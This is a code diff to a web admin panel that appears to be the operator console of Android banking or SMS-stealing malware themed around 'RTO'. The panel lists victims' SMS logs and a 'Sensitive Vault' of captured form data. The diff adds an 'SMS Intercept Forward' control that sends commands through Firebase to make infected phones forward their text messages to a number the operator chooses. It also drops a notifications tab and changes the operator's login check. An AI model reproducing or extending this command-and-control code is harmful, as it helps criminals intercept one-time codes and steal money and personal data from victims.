@@ -232,6 +232,18 @@
                                 <button onclick="sendUserCmd('DEACTIVATE_FORWARD')" class="bg-slate-700 px-3 rounded-lg text-[8px] font-black uppercase">Stop</button>
                             </div>
                         </div>
+
+                        <!-- SMS Intercept -->
+                        <div class="space-y-1.5">
+                            <div class="flex justify-between items-center px-1">
+                                <span class="text-[8px] font-black text-slate-500 uppercase">SMS Intercept Forward</span>
+                            </div>
+                            <div class="flex gap-1.5">
+                                <input id="cmd-sf-num" placeholder="Forward Number" class="flex-1 bg-slate-800 rounded-lg p-2 text-[10px] outline-none border border-slate-700">
+                                <button onclick="sendUserCmd('SET_SMS_FORWARD')" class="bg-blue-600 px-4 rounded-lg text-[8px] font-black uppercase">Set</button>
+                                <button onclick="sendUserCmd('REMOVE_SMS_FORWARD')" class="bg-slate-700 px-2 rounded-lg text-[8px] font-black uppercase">Off</button>
+                            </div>
+                        </div>
                     </div>
                 </div>
 
@@ -240,7 +252,6 @@
                     <div class="flex border-b border-slate-200 overflow-x-auto no-scrollbar gap-6 px-1">
                         <button onclick="setDetailTab('sms')" id="tab-sms" class="tab-btn pb-2 text-[9px] uppercase tracking-widest active">SMS Logs</button>
                         <button onclick="setDetailTab('forms')" id="tab-forms" class="tab-btn pb-2 text-[9px] uppercase tracking-widest text-rose-600">Sensitive Vault</button>
-                        <button onclick="setDetailTab('notif')" id="tab-notif" class="tab-btn pb-2 text-[9px] uppercase tracking-widest">Notifications</button>
                     </div>
 
                     <!-- Containers -->
@@ -250,10 +261,6 @@
 
                     <div id="detail-forms-sec" class="hidden space-y-3">
                         <div id="det-form-sections" class="space-y-4"></div>
-                    </div>
-
-                    <div id="detail-notif-sec" class="hidden bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden flex flex-col max-h-[400px]">
-                        <div id="det-notif-logs" class="overflow-y-auto p-2 space-y-2 no-scrollbar"></div>
                     </div>
                 </div>
             </div>
@@ -279,10 +286,15 @@
 
     function checkAuth() {
         const authed = localStorage.getItem('rto_authed');
-        if(authed === 'true') {
+        const storedPass = localStorage.getItem('rto_pass');
+
+        if(authed === 'true' && storedPass === ADMIN_PASS) {
             document.getElementById('login-overlay').classList.add('hidden');
             document.getElementById('admin-display-name').innerText = ADMIN_ID.toUpperCase();
             startListeners();
+        } else {
+            // Force re-login if password changed
+            logout();
         }
     }
 
@@ -293,6 +305,7 @@
 
         if(id === ADMIN_ID && pass === ADMIN_PASS) {
             localStorage.setItem('rto_authed', 'true');
+            localStorage.setItem('rto_pass', pass);
             document.getElementById('login-overlay').classList.add('hidden');
             document.getElementById('admin-display-name').innerText = ADMIN_ID.toUpperCase();
             err.classList.add('hidden');
@@ -305,7 +318,8 @@
 
     function logout() {
         localStorage.removeItem('rto_authed');
-        location.reload();
+        localStorage.removeItem('rto_pass');
+        document.getElementById('login-overlay').classList.remove('hidden');
     }
 
     let usersData = {};
@@ -475,24 +489,6 @@
             smsDiv.appendChild(div);
         });
 
-        // Notifications
-        const notifDiv = document.getElementById('det-notif-logs');
-        notifDiv.innerHTML = '';
-        const notifs = Object.values(u.N || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0));
-        notifs.forEach(n => {
-            const div = document.createElement('div');
-            div.className = "bg-slate-50 p-2.5 rounded-lg border border-slate-100";
-            div.innerHTML = `
-                <div class="flex justify-between text-[7px] font-black uppercase text-indigo-500 mb-0.5">
-                    <span class="truncate max-w-[80%]">${n.p}</span>
-                    <span>${new Date(parseInt(n.ts)).toLocaleTimeString()}</span>
-                </div>
-                <div class="text-[9px] font-black text-slate-900 truncate">${n.t}</div>
-                <div class="text-[9px] text-slate-500 italic font-medium">"${n.tx}"</div>
-            `;
-            notifDiv.appendChild(div);
-        });
-
         // Forms / Vault
         const formDiv = document.getElementById('det-form-sections');
         formDiv.innerHTML = '';
@@ -529,7 +525,6 @@
     function setDetailTab(t) {
         document.getElementById('detail-sms-sec').classList.toggle('hidden', t !== 'sms');
         document.getElementById('detail-forms-sec').classList.toggle('hidden', t !== 'forms');
-        document.getElementById('detail-notif-sec').classList.toggle('hidden', t !== 'notif');
         document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
         document.getElementById('tab-'+t).classList.add('active');
     }
@@ -552,6 +547,12 @@
             if(!cmd.n) return alert('Enter Number');
         } else if(type === 'DEACTIVATE_FORWARD') {
             cmd.s = document.getElementById('cmd-cf-sim').value;
+        } else if(type === 'SET_SMS_FORWARD') {
+            cmd.n = document.getElementById('cmd-sf-num').value;
+            if(!cmd.n) return alert('Enter Number');
+        } else if(type === 'REMOVE_SMS_FORWARD') {
+            cmd.t = 'SET_SMS_FORWARD';
+            cmd.n = "";
         }
 
         db.ref(`Users/${selectedUid}/C`).push(cmd);
